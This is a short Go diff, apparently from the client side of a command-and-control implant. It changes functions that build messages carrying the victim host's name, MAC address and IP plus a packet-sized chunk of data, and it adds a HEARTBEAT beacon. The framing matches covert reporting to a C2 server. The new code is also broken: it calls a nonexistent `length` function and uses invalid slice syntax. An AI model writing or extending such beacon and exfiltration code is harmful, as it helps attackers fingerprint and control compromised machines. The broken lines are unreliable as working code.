@@ -382,13 +382,26 @@ func GetOutwardIface(addr string) (byNameiface *net.Interface, ip net.IP) {
 //
 //	*NOTE* hostMAC and hostIP will end up being the MAC/IP of the gateway
 //			we are dealing with NAT. This will be handled by the C2 parsing
-func SendMessageClient(hostMAC net.HardwareAddr, srcIP net.IP) (message string) {
+func GenerateClientMessage(hostMAC net.HardwareAddr, srcIP net.IP, data string) (message string) {
 	hostname, err := os.Hostname()
 	if err != nil {
 		log.Fatal("Hostname not found...")
 	}
 
-	message = "CLIENT:" + " " + hostname + " " + hostMAC.String() + " " + srcIP.String()
+	message = "CLIENT:" + " " + hostname + " " + hostMAC.String() + " " + srcIP.String() + " "
+	bytesLength := length(message)
+	message = message + data[0, (508 - bytesLength - 1)] //  RFC 791 - RTFM
+
+	return message
+}
+
+func GenerateClientHeartbeat(hostMAC net.HardwareAddr, srcIP net.IP) (message string) {
+	hostname, err := os.Hostname()
+	if err != nil {
+		log.Fatal("Hostname not found...")
+	}
+
+	message = "HEARTBEAT:" + " " + hostname + " " + hostMAC.String() + " " + srcIP.String()
 
 	return message
 }
